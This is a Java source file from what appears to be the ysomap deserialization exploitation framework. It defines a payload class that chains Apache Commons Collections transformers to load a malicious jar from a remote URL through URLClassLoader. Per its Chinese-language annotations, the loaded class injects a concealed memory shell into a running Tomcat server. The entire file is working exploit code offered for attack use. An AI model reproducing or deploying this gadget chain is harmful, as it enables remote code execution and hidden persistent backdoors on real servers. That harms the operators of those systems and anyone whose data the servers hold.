package ysomap.bullets.collections;

import ysomap.common.annotation.*;

import java.net.URLClassLoader;
import java.util.LinkedList;

/**
 * @author wh4am1
 * @since 2021/12/08
 */
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("魔改的TransformerWithURLClassLoaderBullet，注入隐蔽的内存shell到运行的Tomcat中, 需要指定目标系统JDK下的Tools.jar路径")
@Targets({Targets.JDK})
@Authors({ "Wh4am1" })
public class TransformerWithTomcatConcealedMemShellBullet extends AbstractTransformerBullet {
    @NotNull
    @Require(name="className", detail = "ClassWithTomcatConcealedMemShell生成的恶意类名，如org.test.evil.RunApp")
    public String className;

    @NotNull
    @Require(name = "jarUrl" ,detail = "生成的恶意Jar包的远程地址, 如 http://localhost:80/EvilObj.jar")
    public String jarUrl;

    @NotNull
    @Require(name="jdkToolsPath", detail = "JDK目录下Tools.jar的绝对路径,如：file:C:\\Program Files\\Java\\jdk1.8.0_181\\lib\\tools.jar")
    public String jdkToolsPath;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    /**
     * 利用URLClassLoader进行远程class或jar文件载入
     * 这里远程服务器挂载可以使用exploit里的xxx
     * @return transformers[]
     * @throws Exception err
     */
    @Override
    public Object getObject() throws Exception {
        initClazz(version);

        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(URLClassLoader.class));
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"newInstance", new Class[]{java.net.URL[].class} }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class },
                new Object[] {null, new Object[] {
                        new java.net.URL[] { new java.net.URL(jarUrl) }
                }})
        );
        transformers.add(createInvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { className }));
        //获取对应的构造方法
        transformers.add(createInvokerTransformer("getDeclaredConstructor",
                new Class[] { Class[].class }, new Object[] {new Class[]{String.class,String.class} }));
        transformers.add(createInvokerTransformer("newInstance",
                new Class[] {Object[].class },
                new Object[] {
                        new Object[] {
                                jarUrl,
                                jdkToolsPath
                        }
                })
        );

        return createTransformerArray(transformers);
    }
}
